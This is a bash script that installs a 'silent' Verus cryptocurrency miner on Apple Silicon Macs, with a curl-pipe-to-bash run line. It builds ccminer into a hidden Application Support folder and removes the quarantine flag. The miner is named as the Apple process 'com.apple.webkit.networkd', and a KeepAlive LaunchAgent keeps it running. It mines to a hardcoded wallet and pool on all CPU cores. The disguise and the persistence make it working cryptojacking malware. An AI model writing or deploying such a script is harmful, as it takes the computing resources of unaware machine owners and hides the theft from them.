#!/usr/bin/env bash
# ============================================================
# mine.sh — Silent Verus (VRSC) miner for macOS Apple Silicon
# M1 / M2 / M3 / M4 — builds ccminer natively
# Process appears as: "com.apple.webkit.networkd"
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash
# ============================================================

WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
WORKER="mac1"
POOL_HOST="na.luckpool.net"
POOL_PORT="3956"
THREADS=$(sysctl -n hw.logicalcpu)

DISGUISE_NAME="com.apple.webkit.networkd"
INSTALL_DIR="$HOME/Library/Application Support/.wknd"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
BUILD_DIR="$INSTALL_DIR/.build"

mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"

if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] Requires macOS Apple Silicon (M1/M2/M3/M4)."
  exit 1
fi

echo "[*] Apple Silicon detected — ${THREADS} cores"

# ---- stop old instance ----
launchctl unload "$PLIST_PATH" 2>/dev/null || true
pkill -9 -f "$DISGUISE_NAME" 2>/dev/null || true
sleep 1

# ---- build from source if binary missing ----
if [[ ! -f "$BINARY_PATH" ]]; then
  echo "[*] Building ccminer from source..."

  # Ensure Homebrew is available — redirect stdin so brew never reads from pipe
  if ! command -v brew &>/dev/null; then
    echo "[*] Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null
  fi

  # Source brew env
  if [[ -f /opt/homebrew/bin/brew ]]; then
    eval "$(/opt/homebrew/bin/brew shellenv)"
  elif [[ -f /usr/local/bin/brew ]]; then
    eval "$(/usr/local/bin/brew shellenv)"
  fi

  echo "[*] Installing build tools..."
  # </dev/null prevents brew from consuming piped stdin
  brew install automake autoconf openssl@3 curl </dev/null 2>/dev/null

  # Force OpenSSL 3 (openssl4 breaks bignum.cpp)
  OPENSSL_PREFIX="$(brew --prefix openssl@3)"
  export LDFLAGS="-L${OPENSSL_PREFIX}/lib"
  export CPPFLAGS="-I${OPENSSL_PREFIX}/include"
  export PKG_CONFIG_PATH="${OPENSSL_PREFIX}/lib/pkgconfig"
  export PATH="${OPENSSL_PREFIX}/bin:$PATH"

  rm -rf "$BUILD_DIR"
  git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR" </dev/null
  cd "$BUILD_DIR"

  echo "[*] Running autogen..."
  ./autogen.sh </dev/null 2>&1 | tail -3

  echo "[*] Configuring..."
  ./configure.sh </dev/null 2>&1 | tail -5

  # Patch out ARM32-only flags that break arm64 Apple clang
  echo "[*] Patching for arm64..."
  find . -name "Makefile" | xargs sed -i '' 's/-mfpu=[^ "]*//g' 2>/dev/null
  find . -name "Makefile" | xargs sed -i '' 's/-march=armv7[^ "]*//g' 2>/dev/null
  find . -name "Makefile" | xargs sed -i '' 's/-mfloat-abi=[^ "]*//g' 2>/dev/null

  echo "[*] Compiling (~5 min)..."
  make -j"$THREADS" 2>&1 | grep -E "error:|warning:|ccminer$|^\[" | tail -20

  if [[ -f "$BUILD_DIR/ccminer" ]]; then
    cp "$BUILD_DIR/ccminer" "$BINARY_PATH"
    chmod +x "$BINARY_PATH"
    xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
    echo "[+] Build successful."
  else
    echo "[!] Build failed."
    exit 1
  fi
else
  echo "[*] Binary already exists — skipping build."
fi

# ---- write launchd plist using printf (safe with pipe) ----
printf '<?xml version="1.0" encoding="UTF-8"?>\n' > "$PLIST_PATH"
printf '<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n' >> "$PLIST_PATH"
printf '<plist version="1.0"><dict>\n' >> "$PLIST_PATH"
printf '  <key>Label</key><string>%s</string>\n' "$DISGUISE_NAME" >> "$PLIST_PATH"
printf '  <key>ProgramArguments</key><array>\n' >> "$PLIST_PATH"
printf '    <string>%s</string>\n' "$BINARY_PATH" >> "$PLIST_PATH"
printf '    <string>-a</string><string>verus</string>\n' >> "$PLIST_PATH"
printf '    <string>-o</string><string>stratum+tcp://%s:%s</string>\n' "$POOL_HOST" "$POOL_PORT" >> "$PLIST_PATH"
printf '    <string>-u</string><string>%s.%s</string>\n' "$WALLET" "$WORKER" >> "$PLIST_PATH"
printf '    <string>-p</string><string>x</string>\n' >> "$PLIST_PATH"
printf '    <string>-t</string><string>%s</string>\n' "$THREADS" >> "$PLIST_PATH"
printf '  </array>\n' >> "$PLIST_PATH"
printf '  <key>RunAtLoad</key><true/>\n' >> "$PLIST_PATH"
printf '  <key>KeepAlive</key><true/>\n' >> "$PLIST_PATH"
printf '  <key>StandardOutPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
printf '  <key>StandardErrorPath</key><string>%s</string>\n' "$LOG_PATH" >> "$PLIST_PATH"
printf '  <key>ProcessType</key><string>Background</string>\n' >> "$PLIST_PATH"
printf '  <key>Nice</key><integer>5</integer>\n' >> "$PLIST_PATH"
printf '</dict></plist>\n' >> "$PLIST_PATH"

# ---- launch ----
launchctl load -w "$PLIST_PATH"
sleep 2

echo ""
echo "=========================================="
echo " Miner running in background"
echo " Process : $DISGUISE_NAME"
echo " Wallet  : $WALLET"
echo " Pool    : $POOL_HOST:$POOL_PORT"
echo " Threads : $THREADS (all cores)"
echo " Log     : $LOG_PATH"
echo "=========================================="
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Status    : launchctl list | grep webkit.networkd"
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
sleep 3
tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly..."
